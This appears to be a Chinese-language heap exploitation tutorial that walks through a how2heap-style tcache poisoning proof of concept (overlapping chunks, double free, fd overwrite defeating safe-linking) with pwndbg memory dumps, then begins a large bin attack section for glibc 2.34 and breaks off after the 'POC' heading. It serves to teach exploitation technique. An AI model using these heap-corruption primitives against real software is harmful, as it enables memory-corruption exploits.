
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
    size_t stack_var[4];
    size_t *x[7];
    for(int i=0; i<7; i++) x[i] = malloc(0x80);
    size_t *prev = malloc(0x80);
    size_t *a = malloc(0x80);
    malloc(0x10); //padding chunk or will double free

    for(int i=0; i<7; i++) free(x[i]);
    free(a); // a in unsorted bin
    free(prev);

    malloc(0x80);
    free(a); // a in tcache

    size_t *b = malloc(0xb0);
    b[0x90/sizeof(size_t)] = (size_t)((long)stack_var ^ ((long)a >> 12)); // poison tcache

    malloc(0x80);
    size_t *c = malloc(0x80);
    assert(c == stack_var);
}
```

### pwndbg调试

老开头，`fake_chunk`和`tcache`填充。

再申请两个`0x80`大小的chunk，`a`和`prev`。这两个chunk将会成为overlap chunk。`a`将会double free。

`0x10`的chunk用于防止`a`与top chunk合并。

【注：`free()`的时候，如果chunk与`top chunk`物理相邻，该chunk就会并入`top chunk`。所以会设计一个`padding chunk`作为分隔，防止并入`top chunk`】

```C
/*
If the chunk borders the current high end of memory,
consolidate into top
*/
else {
    size += nextsize;
    set_head(p, size | PREV_INUSE);
    av->top = p;
    check_chunk(av, p);
}
```

接下来`free`掉`a`和`prev`。`a`在`free()`之后会进入`unsorted bin`。再次`free(prev)`的时候，就会触发`consolidate forward`，与物理相邻的高地址chunk `a`进行合并。

![](upload/attach/202204/882497_EMW5AUNZ5MHUWVF.png)

堆的布局变化：

```shell
pwndbg> p prev
$1 = (size_t *) 0x555555757690
pwndbg> x/32gx 0x555555757680
0x555555757680: 0x0000000000000000 0x0000000000000091(chunk prev)
0x555555757690: 0x0000000000000000 0x0000000000000000
0x5555557576a0: 0x0000000000000000 0x0000000000000000
0x5555557576b0: 0x0000000000000000 0x0000000000000000
0x5555557576c0: 0x0000000000000000 0x0000000000000000
0x5555557576d0: 0x0000000000000000 0x0000000000000000
0x5555557576e0: 0x0000000000000000 0x0000000000000000
0x5555557576f0: 0x0000000000000000 0x0000000000000000
0x555555757700: 0x0000000000000000 0x0000000000000000
0x555555757710: 0x0000000000000000 0x0000000000000091(chunk a)
0x555555757720: 0x0000000000000000 0x0000000000000000
0x555555757730: 0x0000000000000000 0x0000000000000000
0x555555757740: 0x0000000000000000 0x0000000000000000
0x555555757750: 0x0000000000000000 0x0000000000000000
0x555555757760: 0x0000000000000000 0x0000000000000000
0x555555757770: 0x0000000000000000 0x0000000000000000
pwndbg> n
pwndbg> n
pwndbg> x/32gx 0x555555757680
0x555555757680: 0x0000000000000000 0x0000000000000121(prev consolidate a)
0x555555757690: 0x00007ffff7dbecc0 0x00007ffff7dbecc0
0x5555557576a0: 0x0000000000000000 0x0000000000000000
0x5555557576b0: 0x0000000000000000 0x0000000000000000
0x5555557576c0: 0x0000000000000000 0x0000000000000000
0x5555557576d0: 0x0000000000000000 0x0000000000000000
0x5555557576e0: 0x0000000000000000 0x0000000000000000
0x5555557576f0: 0x0000000000000000 0x0000000000000000
0x555555757700: 0x0000000000000000 0x0000000000000000
0x555555757710: 0x0000000000000000 0x0000000000000091(chunk a)
0x555555757720: 0x00007ffff7dbecc0 0x00007ffff7dbecc0
0x555555757730: 0x0000000000000000 0x0000000000000000
0x555555757740: 0x0000000000000000 0x0000000000000000
0x555555757750: 0x0000000000000000 0x0000000000000000
0x555555757760: 0x0000000000000000 0x0000000000000000
0x555555757770: 0x0000000000000000 0x0000000000000000
```

这时候从`tcache bin`中申请一个`0x80`大小的chunk，让`tcache`空出一个位置。再`free(a)`（double free）的时候chunk `a`就会进入`tcache bin`链的头部。

```shell
pwndbg> bins
top: 0x5555557577c0 (size : 0x20840)
last_remainder: 0x0 (size : 0x0)
unsortbin: 0x555555757680 (size : 0x120)
(0x90) tcache_entry[7](6): 0x555555757570 --> 0x5555557574e0 --> 0x555555757450 --> 0x5555557573c0 --> 0x555555757330 --> 0x5555557572a0
pwndbg> n
pwndbg> bins
top: 0x5555557577c0 (size : 0x20840)
last_remainder: 0x0 (size : 0x0)
unsortbin: 0x555555757680 (overlap chunk with 0x555555757710(freed) )
(0x90) tcache_entry[7](7): 0x555555757720 --> 0x555555757570 --> 0x5555557574e0 --> 0x555555757450 --> 0x5555557573c0 --> 0x555555757330 --> 0x5555557572a0
```

此时的堆内存布局：

```shell
pwndbg> x/32gx 0x555555757680
0x555555757680: 0x0000000000000000 0x0000000000000121
0x555555757690: 0x00007ffff7dbecc0 0x00007ffff7dbecc0
0x5555557576a0: 0x0000000000000000 0x0000000000000000
0x5555557576b0: 0x0000000000000000 0x0000000000000000
0x5555557576c0: 0x0000000000000000 0x0000000000000000
0x5555557576d0: 0x0000000000000000 0x0000000000000000
0x5555557576e0: 0x0000000000000000 0x0000000000000000
0x5555557576f0: 0x0000000000000000 0x0000000000000000
0x555555757700: 0x0000000000000000 0x0000000000000000
0x555555757710: 0x0000000000000000 0x0000000000000091
0x555555757720: 0x0000555000202227 0x0853b65edf729b6c
0x555555757730: 0x0000000000000000 0x0000000000000000
0x555555757740: 0x0000000000000000 0x0000000000000000
0x555555757750: 0x0000000000000000 0x0000000000000000
0x555555757760: 0x0000000000000000 0x0000000000000000
0x555555757770: 0x0000000000000000 0x0000000000000000
```

下面一步是关键的修改chunk `a`的`fd`指针。

由于chunk `prev`已经overlap了chunk `a`，这时候申请一个合适大小（可以在`unsorted bin`中进行切割获取）的chunk `b`，通过操作chunk `b`的地址来修改chunk `a`的`fd`指针为`fake_chunk`的地址（`&stack_var`）。注意`PTR_PROTECT`地址保护。前面的文章有写到。

其实申不申请都一样，只要可以修改chunk `a`就可以。也就是下面这条语句的效果是一样的。

```C
prev[18] = (size_t)((long)stack_var ^ ((long)a >> 12));
```

这样就把`stack_var`也“链入”了`tcache bin`。

```shell
pwndbg> bins
top: 0x5555557577c0 (size : 0x20840)
last_remainder: 0x555555757740 (size : 0x60)
unsortbin: 0x555555757740 (overlap chunk with 0x555555757710(freed) )
(0x90) tcache_entry[7](7): 0x555555757720 --> 0x7fffffffdaa0 --> 0xfffffff800000002 (unaligned tcache chunk)
```

`malloc()`出chunk `a`之后，`tcache bin`链表头变成`stack_var`。再次`malloc()`就能申请到`target_addr`，即`stack_var`。

## large_bin_attack_glibc2.34

### 原理

看一下`largebin` `nextsize`的分布：

![](upload/attach/202204/882497_MYTFNQVCJSTUQA9.png)

在`malloc()`的时候，遍历`unsorted bin`时会将遍历过的又不是恰好大小`size`的chunk填入对应`small bin`或者`large bin`。插入`large bin`的时候，`fd_nextsize`是指向`size`变小的方向。同时，更改`fd_nextsize`和`bk_nextsize`指针内容。我们的攻击就是在修改`nextsize`链时完成的。

`victim` chunk 链入`large bin`的时候，遍历链表，找到合适的位置插入。将`victim`的`fd_nextsize`指针指向双向链表的第一个节点即最大的chunk，`bk_nextsize`指向比它大的chunk。后面调试的时候细说。

### POC

`how2heap`源码
